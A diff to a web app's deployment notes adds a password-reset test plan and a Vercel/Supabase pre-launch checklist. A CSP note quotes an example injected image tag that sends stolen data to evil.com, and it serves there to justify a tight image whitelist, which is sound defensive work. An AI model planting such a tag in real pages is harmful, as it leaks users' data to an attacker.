@@ -68,7 +68,31 @@ Walk through Supabase dashboard → **Authentication** and confirm each setting 
 - **Allow new users to sign up** — verify it's ON (it is by default; would only turn off if you wanted to lock signups).
 - **Database → Tables → Policies** — re-verify the RLS policies one more time before launch.
 
-### 12. Expand the CSP `img-src` whitelist when adding new poster sources
+### 12. Test the forgot-password / reset-password flow end-to-end
+The reset flow is implemented but untested. To verify (recommend from the same machine running `npm run dev` since the reset link redirects to localhost):
+- Sign out → "Forgot password?" → enter your account email → "Send reset link"
+- Check inbox → click the link → confirm the ResetPasswordPage appears
+- Enter a new password (twice) → confirm you stay signed in with the new password
+- Sign out, sign back in with the new password → should work
+- (Negative case) On the Sign In page, click "Forgot password?" → enter a username (no @) → should toast "Password reset is not available" without sending anything
+
+### 13. Pre-deploy readiness checklist (do before going live on Vercel)
+Bundle of things to confirm before flipping the switch:
+- [Vercel] project connected to the repo; `main` branch deploys to production
+- [Vercel] env vars set: `VITE_SUPABASE_URL`, `VITE_SUPABASE_ANON_KEY` (and `VITE_TMDB_TOKEN` if using TMDB search)
+- [Supabase] complete the audit in **#11** (Confirm email ON, Site URL = production URL, etc.)
+- [Supabase] add the production Vercel URL to **URL Configuration → Redirect URLs**
+- [App] `index.html` CSP `connect-src` already covers `*.supabase.co`; no change needed unless using a custom Supabase domain
+- [App] `index.html` CSP `img-src` — confirm all expected poster sources are whitelisted (see #14)
+- Smoke-test the full flow on the deployed URL from a phone / second device (not just localhost):
+  - Sign up with email → confirm via email link → land back in the app
+  - Add an item → verify it persists
+  - Change email → confirm via email link
+  - Forgot password → reset via email link
+- Database backup strategy: enable Supabase **Database → Backups** (paid tier) OR document a manual `pg_dump` schedule
+- Confirm `npm audit` is still clean before the build
+
+### 14. Expand the CSP `img-src` whitelist when adding new poster sources
 `index.html` line 7 currently allows poster images from `'self'`, `https://image.tmdb.org`, and inline `data:` URIs only. This is intentionally tight to prevent data exfiltration via injected `<img src="https://evil.com/log?stolen=...">`. When you let users add posters from other hosts (IMDB, personal photo URLs, etc.), add those hosts to `img-src`. Any image not on the whitelist will silently fail to load.
 
 ---
